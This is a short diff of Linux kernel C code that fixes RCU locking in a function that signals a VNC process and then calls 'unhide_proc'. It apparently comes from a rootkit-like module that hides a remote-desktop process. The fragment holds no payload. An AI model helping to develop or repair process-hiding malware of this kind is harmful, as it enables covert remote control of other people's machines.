@@ -54,9 +54,9 @@ void stop_vnc(void)
 
 		rcu_read_lock();
 		t = pid_task(find_vpid(vnc_pid), PIDTYPE_PID);
-		rcu_read_unlock();
-		if( t != NULL)
+		if(t != NULL)
 			send_sig_info(42, &info, t);
+		rcu_read_unlock();
 
 		unhide_proc(vnc_pid);
 	}
